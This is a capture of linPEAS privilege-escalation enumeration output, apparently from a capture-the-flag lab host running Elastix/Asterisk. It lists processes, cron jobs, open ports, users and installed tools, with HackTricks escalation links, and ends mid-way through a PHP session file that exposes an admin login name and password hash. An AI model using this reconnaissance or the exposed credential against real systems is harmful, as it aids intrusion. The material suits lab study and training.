+root      3665  0.0  0.0   5716   416 ?        S    10:48   0:00  _ /usr/sbin/saslauthd -m /var/run/saslauthd -a pam
+root      3666  0.0  0.0   5716   416 ?        S    10:48   0:00  _ /usr/sbin/saslauthd -m /var/run/saslauthd -a pam
+asterisk  3706  0.0  0.0   4636   564 ?        S    10:48   0:00 -bash -c cd /var/www/html/panel && /var/www/html/panel/safe_opserver &
+asterisk  3707  0.0  0.1   4584  1144 ?        S    10:48   0:00  _ sh /var/www/html/panel/safe_opserver
+asterisk  3710  0.0  0.8  12656  8676 ?        S    10:48   0:00      _ /usr/bin/perl /var/www/html/panel/op_server.pl
+root      3754  0.0  1.3  19288 13916 ?        Ss   10:48   0:02 /usr/bin/perl /usr/libexec/webmin/miniserv.pl /etc/webmin/miniserv.conf
+root      3757  0.0  0.0   1760   472 tty1     Ss+  10:48   0:00 /sbin/mingetty tty1
+root      3758  0.0  0.0   1760   472 tty2     Ss+  10:48   0:00 /sbin/mingetty tty2
+root      3759  0.0  0.0   1760   476 tty3     Ss+  10:48   0:00 /sbin/mingetty tty3
+root      3762  0.0  0.0   1760   472 tty4     Ss+  10:48   0:00 /sbin/mingetty tty4
+root      3763  0.0  0.0   1760   476 tty5     Ss+  10:48   0:00 /sbin/mingetty tty5
+root      3764  0.0  0.0   1760   476 tty6     Ss+  10:48   0:00 /sbin/mingetty tty6
+root     27817  0.0  0.0   5888   744 ?        Ss   11:59   0:00 sudo -
+root     27818  0.0  0.1   7052  1720 ?        S    11:59   0:00  _ /usr/sbin/sendmail -t
+root     27819  0.0  0.1   7024  1736 ?        S    11:59   0:00      _ /usr/sbin/postdrop -r
+
+╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                                                                                                                                                                                     
+168K -rwxr-sr-x 1 root postdrop 157K May 31  2011 /usr/sbin/postdrop                                                                                                                                                                                                                                                        
+
+╔══════════╣ Files opened by processes belonging to other users
+╚ This is usually empty because of the lack of privileges to read other user processes information                                                                                                                                                                                                                          
+COMMAND     PID      USER   FD      TYPE     DEVICE     SIZE       NODE NAME                                                                                                                                                                                                                                                
+
+╔══════════╣ Processes with credentials in memory (root req)
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                                                                                                                                                                               
+gdm-password Not Found                                                                                                                                                                                                                                                                                                      
+gnome-keyring-daemon Not Found                                                                                                                                                                                                                                                                                              
+lightdm Not Found                                                                                                                                                                                                                                                                                                           
+vsftpd Not Found                                                                                                                                                                                                                                                                                                            
+apache2 Not Found                                                                                                                                                                                                                                                                                                           
+sshd Not Found                                                                                                                                                                                                                                                                                                              
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Cron jobs
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                                                                                                                                                                           
+/usr/bin/crontab                                                                                                                                                                                                                                                                                                            
+2 * * * * /var/lib/asterisk/bin/freepbx-cron-scheduler.php
+incrontab Not Found
+-rw-r--r-- 1 root root    0 Apr  7  2017 /etc/cron.deny                                                                                                                                                                                                                                                                     
+-rw-r--r-- 1 root root  255 Jan  6  2007 /etc/crontab
+
+/etc/cron.daily:
+total 76
+drwxr-xr-x  2 root root 4096 Apr  7  2017 .
+drwxr-xr-x 78 root root 4096 Dec 24 10:48 ..
+lrwxrwxrwx  1 root root   39 Apr  7  2017 0logwatch -> /usr/share/logwatch/scripts/logwatch.pl
+-rwxr-xr-x  1 root root  115 Nov  1  2011 asterisk_cleanup
+-rwxr-xr-x  1 root root  921 Jun  8  2011 cyrus-imapd
+-rwxr-xr-x  1 root root  503 Jul 14  2011 hylafax
+-rwxr-xr-x  1 root root  180 Nov  5  2010 logrotate
+-rwxr-xr-x  1 root root  418 Jan  6  2007 makewhatis.cron
+-rwxr-xr-x  1 root root 2181 Jun 21  2006 prelink
+-rwxr-xr-x  1 root root  296 Mar  6  2011 rpm
+
+/etc/cron.hourly:
+total 24
+drwxr-xr-x  2 root root 4096 Apr  7  2017 .
+drwxr-xr-x 78 root root 4096 Dec 24 10:48 ..
+-rwxr-xr-x  1 root root  253 Jul 14  2011 hylafax
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Jan  6  2007 .
+drwxr-xr-x 78 root root 4096 Dec 24 10:48 ..
+
+/etc/cron.weekly:
+total 32
+drwxr-xr-x  2 root root 4096 Apr  7  2017 .
+drwxr-xr-x 78 root root 4096 Dec 24 10:48 ..
+-rwxr-xr-x  1 root root 1938 Jan 27  2010 99-raid-check
+-rwxr-xr-x  1 root root  414 Jan  6  2007 makewhatis.cron
+SHELL=/bin/bash
+PATH=/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+HOME=/
+
+
+╔══════════╣ Systemd PATH
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                                                                                                                                                                                   
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Analyzing .service files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                                                                                                                                                                                      
+You can't write on systemd PATH                                                                                                                                                                                                                                                                                             
+
+╔══════════╣ System timers
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Analyzing .timer files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                                                                                                                                                                                        
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Analyzing .socket files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Unix Sockets Listening
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                                                                                                                                                                                       
+/anvil                                                                                                                                                                                                                                                                                                                      
+/bounce
+/bsmtp
+/cleanup
+/cyrus
+/defer
+/dev/log
+  └─(Read Write)
+/discard
+/error
+/flush
+/ifmail
+/lmtp
+/local
+/maildrop
+/old-cyrus
+/proxymap
+/relay
+/rewrite
+/scache
+/showq
+/smtp
+/tlsmgr
+/tmp/.font-unix/fs7100
+  └─(Read Write)
+/trace
+/uucp
+/var/lib/imap/socket/lmtp
+/var/lib/mysql/mysql.sock
+  └─(Read Write)
+/var/run/acpid.socket
+  └─(Read Write)
+/var/run/asterisk/asterisk.ctl
+  └─(Read Write)
+/var/run/audispd_events
+/var/run/dbus/system_bus_socket
+  └─(Read Write)
+/var/run/hald/dbus-gQPQrD3hNh
+/var/run/hald/dbus-qTS6SHbXaR
+/var/run/saslauthd/mux
+  └─(Read Write)
+/var/run/vmware/guestServicePipe
+  └─(Read Write)
+/verify
+/virtual
+
+╔══════════╣ D-Bus config files
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                                                                                                                                                                         
+Possible weak user policy found on /etc/dbus-1/system.d/hal.conf (  <policy user="haldaemon">                                                                                                                                                                                                                               
+  <policy user="0">)
+
+╔══════════╣ D-Bus Service Objects list
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                                                                                                                                                                         
+busctl Not Found                                                                                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                                                                                                            
+
+                                        ╔═════════════════════╗
+════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                                                                                                                                                                                     
+                                        ╚═════════════════════╝                                                                                                                                                                                                                                                             
+╔══════════╣ Hostname, hosts and DNS
+127.0.0.1       localhost       beep localhost.localdomain localhost                                                                                                                                                                                                                                                        
+::1             localhost6.localdomain6 localhost6
+nameserver 10.10.10.2
+
+╔══════════╣ Interfaces
+eth0      Link encap:Ethernet  HWaddr 00:50:56:B9:11:0E                                                                                                                                                                                                                                                                     
+          inet addr:10.10.10.7  Bcast:10.10.10.255  Mask:255.255.255.0
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:579089 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:518050 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000 
+          RX bytes:58958513 (56.2 MiB)  TX bytes:111807691 (106.6 MiB)
+          Interrupt:59 Base address:0x2024 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:2974 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:2974 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+          RX bytes:244243 (238.5 KiB)  TX bytes:244243 (238.5 KiB)
+
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                                                                                                                                                                    
+tcp        0      0 0.0.0.0:993                 0.0.0.0:*                   LISTEN      -                                                                                                                                                                                                                                   
+tcp        0      0 0.0.0.0:995                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 127.0.0.1:20004             0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:5038                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:110                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:878                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:4559                0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:143                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:111                 0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:10000               0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      11563/sh            
+tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:25                  0.0.0.0:*                   LISTEN      -                   
+tcp        0      0 0.0.0.0:443                 0.0.0.0:*                   LISTEN      11563/sh            
+tcp        0      0 0.0.0.0:4445                0.0.0.0:*                   LISTEN      3710/perl           
+tcp        0      0 0.0.0.0:4190                0.0.0.0:*                   LISTEN      -                   
+
+╔══════════╣ Can I sniff with tcpdump?
+No                                                                                                                                                                                                                                                                                                                          
+                                                                                                                                                                                                                                                                                                                            
+
+
+                                         ╔═══════════════════╗
+═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                                                                                                                                                                                     
+                                         ╚═══════════════════╝                                                                                                                                                                                                                                                              
+╔══════════╣ My user
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                                                                                                                                                                         
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)                                                                                                                                                                                                                                                                    
+
+╔══════════╣ Do I have PGP keys?
+/usr/bin/gpg                                                                                                                                                                                                                                                                                                                
+netpgpkeys Not Found
+netpgp Not Found                                                                                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                                                                                                                 
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Checking sudo tokens
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                                                                                                                                                                           
+ptrace protection is enabled ()                                                                                                                                                                                                                                                                                             
+gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it
+
+╔══════════╣ Checking Pkexec policy
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                                                                                                                                                                                       
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Superusers
+root:x:0:0:root:/root:/bin/bash                                                                                                                                                                                                                                                                                             
+
+╔══════════╣ Users with console
+asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash                                                                                                                                                                                                                                                            
+cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
+fanis:x:501:501::/home/fanis:/bin/bash
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+root:x:0:0:root:/root:/bin/bash
+spamfilter:x:500:500::/home/spamfilter:/bin/bash
+
+╔══════════╣ All users & groups
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon[0m),3(sys),4(adm),6(disk),10(wheel)                                                                                                                                                                                                                                  
+uid=1(bin) gid=1(bin) groups=1(bin),2(daemon[0m),3(sys)
+uid=10(uucp) gid=14(uucp) groups=14(uucp)
+uid=100(asterisk) gid=101(asterisk) groups=101(asterisk)
+uid=11(operator) gid=0(root) groups=0(root)
+uid=12(games) gid=100(users) groups=100(users)
+uid=13(gopher) gid=30(gopher) groups=30(gopher)
+uid=14(ftp) gid=50(ftp) groups=50(ftp)
+uid=2(daemon[0m) gid=2(daemon[0m) groups=2(daemon[0m),1(bin),4(adm),7(lp)
+uid=27(mysql) gid=27(mysql) groups=27(mysql)
+uid=29(rpcuser) gid=29(rpcuser) groups=29(rpcuser)
+uid=3(adm) gid=4(adm) groups=4(adm),3(sys)
+uid=32(rpc) gid=32(rpc) groups=32(rpc)
+uid=38(ntp) gid=38(ntp) groups=38(ntp)
+uid=4(lp) gid=7(lp) groups=7(lp)
+uid=41(mailman) gid=41(mailman) groups=41(mailman)
+uid=43(xfs) gid=43(xfs) groups=43(xfs)
+uid=48(apache) gid=48(apache) groups=48(apache)
+uid=5(sync) gid=0(root) groups=0(root)
+uid=500(spamfilter) gid=500(spamfilter) groups=500(spamfilter)
+uid=501(fanis) gid=501(fanis) groups=501(fanis)
+uid=6(shutdown) gid=0(root) groups=0(root)
+uid=65534(nfsnobody) gid=65534(nfsnobody) groups=65534(nfsnobody)
+uid=68(haldaemon[0m) gid=68(haldaemon[0m) groups=68(haldaemon[0m)
+uid=69(vcsa) gid=69(vcsa) groups=69(vcsa)
+uid=7(halt) gid=0(root) groups=0(root)
+uid=74(sshd) gid=74(sshd) groups=74(sshd)
+uid=76(cyrus) gid=12(mail) groups=12(mail),76(saslauth)
+uid=77(pcap) gid=77(pcap) groups=77(pcap)
+uid=8(mail) gid=12(mail) groups=12(mail)
+uid=81(dbus) gid=81(dbus) groups=81(dbus)
+uid=89(postfix) gid=89(postfix) groups=89(postfix),12(mail)
+uid=9(news) gid=13(news) groups=13(news)
+uid=94(distcache) gid=94(distcache) groups=94(distcache)
+uid=99(nobody) gid=99(nobody) groups=99(nobody)
+
+╔══════════╣ Login now
+ 12:16:04 up  1:27,  0 users,  load average: 2.33, 1.20, 0.71                                                                                                                                                                                                                                                               
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+╔══════════╣ Last logons
+reboot   system boot  2.6.18-238.12.1. Fri Aug 25 17:55          (00:04)                                                                                                                                                                                                                                                    
+root     tty1                          Fri Aug 25 10:20 - down   (00:01)    
+reboot   system boot  2.6.18-238.12.1. Fri Aug 25 10:19          (00:02)    
+root     tty1                          Fri May  5 22:09 - down   (00:54)    
+reboot   system boot  2.6.18-238.12.1. Fri May  5 21:36          (01:27)    
+root     pts/1        192.168.150.109  Fri Apr  7 11:51 - down   (00:00)    
+root     pts/0        192.168.150.109  Fri Apr  7 11:47 - down   (00:04)    
+reboot   system boot  2.6.18-238.12.1. Fri Apr  7 11:25          (00:26)    
+
+wtmp begins Fri Apr  7 11:25:45 2017
+
+╔══════════╣ Last time logon each user
+Username         Port     From             Latest                                                                                                                                                                                                                                                                           
+root             tty1                      Tue Jul 16 11:45:47 +0300 2019
+
+╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+                                                                                                                                                                                                                                                                                                                            
+
+
+                                       ╔══════════════════════╗
+═══════════════════════════════════════╣ Software Information ╠═══════════════════════════════════════                                                                                                                                                                                                                      
+                                       ╚══════════════════════╝                                                                                                                                                                                                                                                             
+╔══════════╣ Useful software
+/usr/bin/base64                                                                                                                                                                                                                                                                                                             
+/usr/bin/curl
+/usr/bin/g++
+/usr/bin/gcc
+/usr/bin/make
+/usr/bin/nc
+/usr/bin/nmap
+/usr/bin/perl
+/usr/bin/php
+/bin/ping
+/usr/bin/python
+/usr/bin/python2
+/usr/bin/sudo
+/usr/bin/wget
+
+╔══════════╣ Installed Compilers
+/usr/bin/gcc                                                                                                                                                                                                                                                                                                                
+/usr/bin/g++
+
+╔══════════╣ MySQL version
+mysql  Ver 14.12 Distrib 5.0.77, for redhat-linux-gnu (i686) using readline 5.1                                                                                                                                                                                                                                             
+
+═╣ MySQL connection using default root/root ........... No
+═╣ MySQL connection using root/toor ................... No                                                                                                                                                                                                                                                                  
+═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                                                                                                                                                  
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Searching mysql credentials and exec
+                                                                                                                                                                                                                                                                                                                            
+╔══════════╣ Analyzing Apache Files (limit 70)
+Version: apache2 Not Found                                                                                                                                                                                                                                                                                                  
+Server version: Apache/2.2.3                                                                                                                                                                                                                                                                                                
+Server built:   May  4 2011 06:51:15
+══╣ PHP exec extensions
+                                                                                                                                                                                                                                                                                                                            
+
+-rw-r--r-- 1 root root 45079 Nov 29  2010 /etc/php.ini
+allow_call_time_pass_reference = Off
+allow_url_fopen = On
+odbc.allow_persistent = On
+mysql.allow_persistent = On
+msql.allow_persistent = On
+pgsql.allow_persistent = On
+sybase.allow_persistent = On
+sybct.allow_persistent = On
+ifx.allow_persistent = On
+mssql.allow_persistent = On
+
+╔══════════╣ Analyzing Http conf Files (limit 70)
+-rw-r--r-- 1 root root 33728 Apr  7  2017 /etc/httpd/conf/httpd.conf                                                                                                                                                                                                                                                        
+AccessFileName .htaccess
+
+╔══════════╣ Analyzing PHP Sessions Files (limit 70)
+/var/lib/php/sessions Not Found                                                                                                                                                                                                                                                                                             
+-rw------- 1 asterisk asterisk 0 Dec 24 11:13 /tmp/sess_0ir8cvl1o6l0soakmqg891ip35                                                                                                                                                                                                                                          
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_0rj1kbjpd4ta66ajb533a9ek07
+-rw------- 1 asterisk asterisk 0 Dec 24 11:23 /tmp/sess_154mivig4ji3nu438g5ge2bva5
+-rw------- 1 asterisk asterisk 0 Dec 24 11:22 /tmp/sess_2s94befegibrhi3hqm2pu7ug73
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_353v4nrtqln0632mmu31clm3s6
+-rw------- 1 asterisk asterisk 0 Dec 24 10:58 /tmp/sess_375gfk685mhm6qipf7349inj85
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_3a3m776efn9aljet745k7jnkn4
+-rw------- 1 asterisk asterisk 0 Dec 24 11:23 /tmp/sess_3dbgvecqbn6rbqfpctg4nklfe4
+-rw------- 1 asterisk asterisk 0 Dec 24 10:57 /tmp/sess_3id7gdif8ff3tbp5sm8pnvppg2
+-rw------- 1 asterisk asterisk 19161 Apr  7  2017 /tmp/sess_48lp7n2s1ehte6sv17mavv4bh3
+elastix_user|s:5:"admin";elastix_pass|s:32:"660e9046facd5095b46721d57c6d9fbc";elastix_user_permission|a:96:{s:9:"grouplist";a:7:{s:2:"id";s:9:"grouplist";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:6:"Groups";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:7:"sysdash";a:7:{s:2:"id";s:7:"sysdash";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:9:"Dashboard";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:11:"myex_config";a:7:{s:2:"id";s:11:"myex_config";s:8:"IdParent";s:12:"my_extension";s:4:"Link";s:0:"";s:4:"Name";s:8:"Settings";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:13:"email_domains";a:7:{s:2:"id";s:13:"email_domains";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:7:"Domains";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"calendar";a:7:{s:2:"id";s:8:"calendar";s:8:"IdParent";s:6:"agenda";s:4:"Link";s:0:"";s:4:"Name";s:8:"Calendar";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:12:"sec_firewall";a:7:{s:2:"id";s:12:"sec_firewall";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:8:"Firewall";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:17:"addons_avalaibles";a:7:{s:2:"id";s:17:"addons_avalaibles";s:8:"IdParent";s:6:"addons";s:4:"Link";s:0:"";s:4:"Name";s:6:"Addons";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:9:"cdrreport";a:7:{s:2:"id";s:9:"cdrreport";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:10:"CDR Report";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"openfire";a:7:{s:2:"id";s:8:"openfire";s:8:"IdParent";s:2:"im";s:4:"Link";s:46:"openfireWrapper.php?IP={NAME_SERVER}&PORT=9090";s:4:"Name";s:8:"OpenFire";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:9:"vtigercrm";a:7:{s:2:"id";s:9:"vtigercrm";s:8:"IdParent";s:6:"extras";s:4:"Link";s:9:"vtigercrm";s:4:"Name";s:9:"vTigerCRM";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:8:"pbxadmin";a:7:{s:2:"id";s:8:"pbxadmin";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:17:"PBX Configuration";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:0;}s:11:"virtual_fax";a:7:{s:2:"id";s:11:"virtual_fax";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:11:"Virtual Fax";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"1";s:8:"HasChild";b:1;}s:14:"email_accounts";a:7:{s:2:"id";s:14:"email_accounts";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:8:"Accounts";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:12:"address_book";a:7:{s:2:"id";s:12:"address_book";s:8:"IdParent";s:6:"agenda";s:4:"Link";s:0:"";s:4:"Name";s:12:"Address Book";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:15:"sec_accessaudit";a:7:{s:2:"id";s:15:"sec_accessaudit";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:5:"Audit";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:3:"a2b";a:7:{s:2:"id";s:3:"a2b";s:8:"IdParent";s:6:"extras";s:4:"Link";s:0:"";s:4:"Name";s:13:"Calling Cards";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:1;}s:12:"channelusage";a:7:{s:2:"id";s:12:"channelusage";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:14:"Channels Usage";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:13:"control_panel";a:7:{s:2:"id";s:13:"control_panel";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:14:"Operator Panel";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:9:"faxmaster";a:7:{s:2:"id";s:9:"faxmaster";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:10:"Fax Master";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"2";s:8:"HasChild";b:0;}s:16:"group_permission";a:7:{s:2:"id";s:16:"group_permission";s:8:"IdParent";s:7:"usermgr";s:4:"Link";s:0:"";s:4:"Name";s:16:"Group Permission";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"network";a:7:{s:2:"id";s:7:"network";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:7:"Network";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:11:"email_relay";a:7:{s:2:"id";s:11:"email_relay";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:5:"Relay";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:13:"sec_weak_keys";a:7:{s:2:"id";s:13:"sec_weak_keys";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:9:"Weak Keys";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"billing";a:7:{s:2:"id";s:7:"billing";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:7:"Billing";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:9:"downloads";a:7:{s:2:"id";s:9:"downloads";s:8:"IdParent";s:6:"extras";s:4:"Link";s:0:"";s:4:"Name";s:9:"Downloads";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:1;}s:9:"voicemail";a:7:{s:2:"id";s:9:"voicemail";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:9:"Voicemail";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:10:"faxclients";a:7:{s:2:"id";s:10:"faxclients";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:11:"Fax Clients";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"3";s:8:"HasChild";b:0;}s:7:"usermgr";a:7:{s:2:"id";s:7:"usermgr";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:5:"Users";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:1;}s:7:"webmail";a:7:{s:2:"id";s:7:"webmail";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:4:"mail";s:4:"Name";s:7:"Webmail";s:4:"Type";s:6:"framed";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:21:"sec_advanced_settings";a:7:{s:2:"id";s:21:"sec_advanced_settings";s:8:"IdParent";s:8:"security";s:4:"Link";s:0:"";s:4:"Name";s:17:"Advanced Settings";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:12:"asterisk_log";a:7:{s:2:"id";s:12:"asterisk_log";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:13:"Asterisk Logs";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:10:"monitoring";a:7:{s:2:"id";s:10:"monitoring";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:10:"Monitoring";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:9:"faxviewer";a:7:{s:2:"id";s:9:"faxviewer";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:10:"Fax Viewer";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"4";s:8:"HasChild";b:0;}s:8:"antispam";a:7:{s:2:"id";s:8:"antispam";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:8:"Antispam";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:14:"graphic_report";a:7:{s:2:"id";s:14:"graphic_report";s:8:"IdParent";s:7:"reports";s:4:"Link";s:0:"";s:4:"Name";s:14:"Graphic Report";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:21:"endpoint_configurator";a:7:{s:2:"id";s:21:"endpoint_configurator";s:8:"IdParent";s:9:"pbxconfig";s:4:"Link";s:0:"";s:4:"Name";s:21:"Endpoint Configurator";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:14:"email_template";a:7:{s:2:"id";s:14:"email_template";s:8:"IdParent";s:3:"fax";s:4:"Link";s:0:"";s:4:"Name";s:14:"Email Template";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"5";s:8:"HasChild";b:0;}s:8:"shutdown";a:7:{s:2:"id";s:8:"shutdown";s:8:"IdParent";s:6:"system";s:4:"Link";s:0:"";s:4:"Name";s:8:"Shutdown";s:4:"Type";s:6:"module";s:8:"order_no";s:1:"6";s:8:"HasChild";b:0;}s:11:"remote_smtp";a:7:{s:2:"id";s:11:"remote_smtp";s:8:"IdParent";s:11:"email_admin";s:4:"Link";s:0:"";s:4:"Name";s:11:"Remote 